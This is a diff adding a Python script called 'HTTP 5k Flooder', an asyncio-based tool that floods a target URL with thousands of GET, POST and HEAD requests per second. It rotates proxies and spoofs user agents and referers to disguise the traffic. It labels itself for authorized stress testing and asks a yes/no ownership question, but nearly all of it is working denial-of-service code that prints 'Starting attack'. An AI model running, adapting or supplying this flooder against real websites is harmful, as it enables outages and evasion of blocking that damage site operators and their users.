@@ -1,0 +1,263 @@
+#!/usr/bin/env python3
+"""
+HTTP 5k Flooder – High‑Performance HTTP Stress Testing Tool
+Sustains 5,000 requests per second using asyncio + aiohttp.
+For authorized testing only.
+"""
+
+import asyncio
+import aiohttp
+import argparse
+import random
+import sys
+import time
+import signal
+from typing import List, Optional
+from dataclasses import dataclass
+from collections import deque
+
+# ========== BANNER ==========
+BANNER = """
+\033[1;31m
+██╗  ██╗████████╗████████╗██████╗      ███████╗██╗      ██████╗  ██████╗ ██████╗
+██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
+███████║   ██║      ██║   ██████╔╝    █████╗  ██║     ██║   ██║██║   ██║██║  ██║
+██╔══██║   ██║      ██║   ██╔═══╝     ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║
+██║  ██║   ██║      ██║   ██║         ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝
+╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝
+\033[1;34m
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;32m
+[+] 5,000 REQUESTS PER SECOND CAPABLE        [+] REAL‑TIME STATISTICS
+[+] RANDOM USER‑AGENTS                         [+] PROXY SUPPORT (OPTIONAL)
+[+] ASYNCIO‑BASED HIGH CONCURRENCY            [+] AUTHORIZED TESTING ONLY
+\033[1;34m
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[0m
+"""
+
+# ========== CONFIGURATION ==========
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Android 14; Mobile; rv:68.0) Gecko/68.0 Firefox/120.0",
+]
+
+REFERERS = [
+    "https://www.google.com/",
+    "https://www.bing.com/",
+    "https://www.yahoo.com/",
+    "https://www.duckduckgo.com/",
+    "https://www.facebook.com/",
+    "https://www.twitter.com/",
+    "https://www.linkedin.com/",
+]
+
+METHODS = ["GET", "POST", "HEAD"]
+
+@dataclass
+class AttackStats:
+    """Real‑time statistics."""
+    sent: int = 0
+    success: int = 0
+    failed: int = 0
+    bytes_received: int = 0
+    start_time: float = 0.0
+
+class HTTP5kFlood:
+    def __init__(self, url: str, duration: int, rate: int, workers: int = 1000,
+                 proxy_file: Optional[str] = None, timeout: int = 5):
+        self.url = url
+        self.duration = duration
+        self.target_rate = rate  # requests per second
+        self.workers = workers
+        self.proxy_file = proxy_file
+        self.timeout = timeout
+        self.running = True
+        self.stats = AttackStats()
+        self.lock = asyncio.Lock()
+        self.proxies = self.load_proxies() if proxy_file else []
+        self.rate_limit_delay = 1.0 / rate if rate > 0 else 0
+
+    def load_proxies(self) -> List[str]:
+        try:
+            with open(self.proxy_file, 'r') as f:
+                proxies = [line.strip() for line in f if line.strip()]
+            print(f"[+] Loaded {len(proxies)} proxies")
+            return proxies
+        except Exception as e:
+            print(f"[!] Failed to load proxies: {e}")
+            return []
+
+    async def worker(self, session: aiohttp.ClientSession, worker_id: int):
+        """Each worker continuously sends requests."""
+        while self.running:
+            try:
+                # Rate limiting: simple delay to maintain global rate
+                if self.rate_limit_delay > 0:
+                    await asyncio.sleep(self.rate_limit_delay / self.workers)
+
+                # Prepare request
+                method = random.choice(METHODS)
+                headers = {
+                    'User-Agent': random.choice(USER_AGENTS),
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Referer': random.choice(REFERERS),
+                    'Connection': 'keep-alive',
+                }
+
+                # Optional proxy per request
+                proxy = random.choice(self.proxies) if self.proxies else None
+
+                # Choose method
+                if method == 'GET':
+                    async with session.get(self.url, headers=headers, proxy=proxy,
+                                           timeout=self.timeout, ssl=False) as resp:
+                        await resp.read()
+                        async with self.lock:
+                            self.stats.sent += 1
+                            if resp.status < 400:
+                                self.stats.success += 1
+                            else:
+                                self.stats.failed += 1
+                            self.stats.bytes_received += len(await resp.read())
+                elif method == 'POST':
+                    # Dummy POST data
+                    data = f"key{random.randint(1,999)}=value{random.randint(1,999)}"
+                    async with session.post(self.url, data=data, headers=headers,
+                                            proxy=proxy, timeout=self.timeout, ssl=False) as resp:
+                        await resp.read()
+                        async with self.lock:
+                            self.stats.sent += 1
+                            if resp.status < 400:
+                                self.stats.success += 1
+                            else:
+                                self.stats.failed += 1
+                            self.stats.bytes_received += len(await resp.read())
+                else:  # HEAD
+                    async with session.head(self.url, headers=headers, proxy=proxy,
+                                            timeout=self.timeout, ssl=False) as resp:
+                        async with self.lock:
+                            self.stats.sent += 1
+                            if resp.status < 400:
+                                self.stats.success += 1
+                            else:
+                                self.stats.failed += 1
+
+            except Exception as e:
+                async with self.lock:
+                    self.stats.failed += 1
+                    self.stats.sent += 1  # we count attempt as sent
+
+    async def stats_reporter(self):
+        """Print statistics every second."""
+        while self.running:
+            await asyncio.sleep(1)
+            elapsed = time.time() - self.stats.start_time
+            async with self.lock:
+                sent = self.stats.sent
+                success = self.stats.success
+                failed = self.stats.failed
+                bytes_rcv = self.stats.bytes_received
+            rps = sent / elapsed if elapsed > 0 else 0
+            mbps = (bytes_rcv * 8) / (1024 * 1024) / elapsed if elapsed > 0 else 0
+            print(f"\r[+] RPS: {rps:.1f} | Total: {sent} | Success: {success} | Failed: {failed} | Down: {mbps:.2f} Mbps | Time: {elapsed:.1f}s", end='', flush=True)
+
+    async def run(self):
+        """Main entry point."""
+        print(f"\n[+] Target: {self.url}")
+        print(f"[+] Duration: {self.duration}s | Target Rate: {self.target_rate} RPS")
+        print(f"[+] Workers: {self.workers} | Proxies: {len(self.proxies)}")
+        print("[+] Starting attack... Press Ctrl+C to stop.\n")
+
+        # Create connector with high limits
+        connector = aiohttp.TCPConnector(
+            limit=0,  # no limit per host
+            ttl_dns_cache=300,
+            force_close=False,
+            ssl=False
+        )
+
+        async with aiohttp.ClientSession(connector=connector) as session:
+            tasks = []
+            for i in range(self.workers):
+                task = asyncio.create_task(self.worker(session, i))
+                tasks.append(task)
+
+            # Start stats reporter
+            self.stats.start_time = time.time()
+            reporter = asyncio.create_task(self.stats_reporter())
+
+            # Wait for duration
+            await asyncio.sleep(self.duration)
+            self.running = False
+
+            # Wait for tasks to finish
+            await asyncio.gather(*tasks, return_exceptions=True)
+            reporter.cancel()
+
+        # Final stats
+        elapsed = time.time() - self.stats.start_time
+        print(f"\n\n[✓] Attack finished.")
+        print(f"    Total requests: {self.stats.sent}")
+        print(f"    Successful: {self.stats.success}")
+        print(f"    Failed: {self.stats.failed}")
+        print(f"    Average RPS: {self.stats.sent/elapsed:.1f}")
+        print(f"    Data received: {self.stats.bytes_received/1024/1024:.2f} MB")
+
+def main():
+    parser = argparse.ArgumentParser(description="HTTP 5k Flooder – Authorized Testing Only")
+    parser.add_argument("url", help="Target URL (e.g., https://laterhayder.com)")
+    parser.add_argument("-d", "--duration", type=int, default=60,
+                        help="Test duration in seconds (default: 60)")
+    parser.add_argument("-r", "--rate", type=int, default=5000,
+                        help="Target requests per second (default: 5000)")
+    parser.add_argument("-w", "--workers", type=int, default=1000,
+                        help="Number of concurrent workers (default: 1000)")
+    parser.add_argument("-p", "--proxies", help="File with proxy list (one per line)")
+    parser.add_argument("--timeout", type=int, default=5,
+                        help="Request timeout in seconds (default: 5)")
+    args = parser.parse_args()
+
+    # Print banner
+    print(BANNER)
+
+    # Legal warning
+    print("=" * 70)
+    print("⚠️  THIS TOOL IS FOR AUTHORIZED TESTING ONLY ⚠️")
+    print("=" * 70)
+    print(f"Target: {args.url}")
+    print(f"Duration: {args.duration}s | Target Rate: {args.rate} RPS")
+    print("=" * 70)
+    confirm = input("Do you own this website or have written permission? (yes/no): ")
+    if confirm.lower() != "yes":
+        print("Exiting. Use only on systems you own.")
+        sys.exit(0)
+
+    # System checks
+    if args.rate > 50000:
+        print("[!] Warning: Very high rate may require system tuning.")
+    if args.workers > 5000:
+        print("[!] Warning: Very high worker count may exceed file descriptor limits.")
+
+    flooder = HTTP5kFlood(
+        url=args.url,
+        duration=args.duration,
+        rate=args.rate,
+        workers=args.workers,
+        proxy_file=args.proxies,
+        timeout=args.timeout
+    )
+
+    try:
+        asyncio.run(flooder.run())
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user.")
+        flooder.running = False
+
+if __name__ == "__main__":
+    main()
